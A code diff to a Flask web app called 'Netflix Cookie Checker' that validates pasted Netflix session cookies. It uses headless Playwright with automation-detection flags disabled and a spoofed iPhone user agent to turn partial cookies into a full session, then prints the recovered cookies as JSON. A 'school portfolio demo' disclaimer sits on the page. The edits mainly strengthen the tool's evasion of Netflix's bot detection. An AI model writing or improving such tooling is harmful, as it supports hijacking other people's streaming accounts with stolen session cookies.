@@ -26,9 +26,10 @@ def parse_cookies(cookie_str):
 
 def recover_full_cookies(partial_cookie_str):
     output = []
-    output.append("\nPartial cookies detected. Recovering full set... (may take 20-60 seconds)")
+    output.append("\nPartial cookies detected. Recovering full set... (may take 20-90 seconds)")
     try:
         with sync_playwright() as p:
+            # Use iPhone UA to better match worker headers and reduce detection
             browser = p.chromium.launch(headless=True, args=[
                 '--disable-blink-features=AutomationControlled',
                 '--no-sandbox',
@@ -37,7 +38,7 @@ def recover_full_cookies(partial_cookie_str):
             ])
             context = browser.new_context(
                 viewport={'width': 1920, 'height': 1080},
-                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+                user_agent='Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
                 locale='en-US',
                 timezone_id='Asia/Manila'
             )
@@ -50,22 +51,27 @@ def recover_full_cookies(partial_cookie_str):
             """)
             page = context.new_page()
             cookies = []
-            for name, value in parse_cookies(partial_cookie_str).items():
+            parsed = parse_cookies(partial_cookie_str)
+            for name, value in parsed.items():
                 cookies.append({
                     'name': name,
                     'value': value,
                     'domain': '.netflix.com',
                     'path': '/',
                     'secure': True,
-                    'httpOnly': True
+                    'httpOnly': True,
+                    'sameSite': 'None'  # Critical for cross-site Netflix cookies
                 })
             context.add_cookies(cookies)
             try:
-                page.goto('https://www.netflix.com/browse', timeout=60000, wait_until='networkidle')
-                page.wait_for_timeout(15000)
+                page.goto('https://www.netflix.com/browse', timeout=90000, wait_until='networkidle')
+                page.wait_for_timeout(20000)  # Give more time for cookies to set
             except Exception as e:
-                output.append(f"Visit failed: {e}")
+                output.append(f"Visit failed: {str(e)}")
             full_cookies = context.cookies('https://www.netflix.com')
+            # Log full recovered cookies for debugging
+            output.append("Recovered cookies (JSON):")
+            output.append(json.dumps(full_cookies, indent=2))
             browser.close()
             if not full_cookies:
                 output.append("No additional cookies recovered.")
@@ -98,7 +104,7 @@ def process_cookie(cookies_input):
             WORKER_URL,
             headers=headers,
             json={'cookies': cookies_input},
-            timeout=30
+            timeout=45
         )
         output.append(f"Status: {r.status_code}\n")
         data = r.json()
@@ -181,7 +187,8 @@ def home():
     <body>
         <h1>Netflix Cookie Checker</h1>
         <div class="disclaimer">
-            <strong>Educational project only – School portfolio demo.</strong><br>   
+            <strong>Educational project only – School portfolio demo.</strong><br>
+            <strong>Note:</strong> Recovery for partial cookies (NetflixId only) may take 1-2 minutes and can fail due to Netflix bot detection.
         </div>
         
         <form method="POST">
@@ -197,7 +204,7 @@ def home():
         {% endif %}
         
         <div class="note">
-            Note: First load may take 30–90 seconds (free hosting sleeps). Recovery step uses browser automation (slow on free hosting).
+            Tip: For best results, try full cookies from Cookie-Editor first. If partial → dead, check logs for recovered keys/flags.
         </div>
     </body>
     </html>
@@ -205,4 +212,4 @@ def home():
     return render_template_string(html, result=result)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=8080, debug=True)
